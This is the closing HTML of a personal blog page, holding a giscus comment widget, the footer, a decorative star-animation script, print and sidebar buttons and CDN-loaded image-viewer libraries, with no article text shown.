data-category-id=DIC_kwDOHqETOs4Ci_rr data-mapping=pathname data-strict=1 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=noborder_light data-lang=en crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"noborder_light":"noborder_dark")}})()</script><footer class=site-footer><section class=copyright>&copy;
2022 -
2024 Dorian B.</section><section class=powerby></section><a href=https://dorianb.net/blog/index.xml target=_blank title="RSS feed" rel=me><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg>
RSS-feed</a></footer><style>.star{display:block;background-color:#fff;position:absolute;border-radius:100%;animation-timing-function:linear;animation-iteration-count:infinite}@keyframes move_right{from{transform:rotate(0)translateX(8px)rotate(0)}to{transform:rotate(360deg)translateX(8px)rotate(-360deg)}}@keyframes move_left{from{transform:rotate(0)translateX(8px)rotate(0)}to{transform:rotate(-360deg)translateX(8px)rotate(360deg)}}</style><script>var randomNumber=function(e,t){return Math.floor(Math.random()*(t-e+1))+e},numberOfStars=randomNumber(350,650),createStars=function(){for(var t,i,a,r,c,l="move_right;",n=document.body,e=document.documentElement,d=Math.max(n.scrollHeight,n.offsetHeight,e.clientHeight,e.scrollHeight,e.offsetHeight),s="",o=0;o<numberOfStars;o++)i=l==="move_right;"?"move_left;":"move_right;",a=randomNumber(0,d),r=randomNumber(0,window.innerWidth),t=randomNumber(0,4),c=randomNumber(6,16),s+="<div class='star' style='top: "+a+"px; left: "+r+"px; width: "+t+"px; height: "+t+"px; animation-name:"+i+"; animation-duration: "+c+"s;z-index: -1;'></div>";document.body.innerHTML+="<div id='stars'>"+s+"</div>"};setTimeout(function(){createStars()},10)</script><style>@media print{.right-sidebar,.left-sidebar,.sidebar,.menu,.star,.site-footer,.article-tags,.article-category,.related-content--wrapper,.related-content,.article-footer,.article-time--reading,.footer,#print,#sidebars-control{display:none}.article-page .main-article{box-shadow:unset}}</style><script>var header,hideSidebar,article_header=document.getElementsByClassName("article-time");article_header.length==1&&(header=article_header[0],header.innerHTML+=`
        <div> 
            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-feather"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 20l10 -10m0 -5v5h5m-9 -1v5h5m-9 -1v5h5m-5 -5l4 -4l4 -4" /><path d="M19 10c.638 -.636 1 -1.515 1 -2.486a3.515 3.515 0 0 0 -3.517 -3.514c-.97 0 -1.847 .367 -2.483 1m-3 13l4 -4l4 -4" /></svg>

            <a href="https://dorianb.net">
                <time class="article-time--published" style="margin-left: -5px;">Dorian BACHELOT</time>
            </a>
        </div>`,header.innerHTML+=`
        <div id="print"> 
            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-printer"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M17 17h2a2 2 0 0 0 2 -2v-4a2 2 0 0 0 -2 -2h-14a2 2 0 0 0 -2 2v4a2 2 0 0 0 2 2h2" /><path d="M17 9v-4a2 2 0 0 0 -2 -2h-6a2 2 0 0 0 -2 2v4" /><path d="M7 13m0 2a2 2 0 0 1 2 -2h6a2 2 0 0 1 2 2v4a2 2 0 0 1 -2 2h-6a2 2 0 0 1 -2 -2z" /></svg>

            <a href="javascript:void('Open print window')" onclick="window.print()">
                <time class="article-time--published" style="margin-left: -5px;">Print</time>
            </a>
        </div>`,hideSidebar=function(){var e,t=document.getElementsByClassName("left-sidebar");t.length>0&&(e=t[0],e.style.display!="none"?e.style.display="none":e.style.display="flex")},header.innerHTML+=`
        <div id="sidebars-control"> 
            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="currentColor"  class="icon icon-tabler icons-tabler-filled icon-tabler-layout-sidebar-left-collapse"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 3a3 3 0 0 1 2.995 2.824l.005 .176v12a3 3 0 0 1 -2.824 2.995l-.176 .005h-12a3 3 0 0 1 -2.995 -2.824l-.005 -.176v-12a3 3 0 0 1 2.824 -2.995l.176 -.005h12zm0 2h-9v14h9a1 1 0 0 0 .993 -.883l.007 -.117v-12a1 1 0 0 0 -.883 -.993l-.117 -.007zm-2.293 4.293a1 1 0 0 1 .083 1.32l-.083 .094l-1.292 1.293l1.292 1.293a1 1 0 0 1 .083 1.32l-.083 .094a1 1 0 0 1 -1.32 .083l-.094 -.083l-2 -2a1 1 0 0 1 -.083 -1.32l.083 -.094l2 -2a1 1 0 0 1 1.414 0z" /></svg>

            <a href="javascript:void('Open print window')" onclick="hideSidebar()">
                <time class="article-time--published" style="margin-left: -5px;">Sidebar</time>
            </a>
        </div>`)</script><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>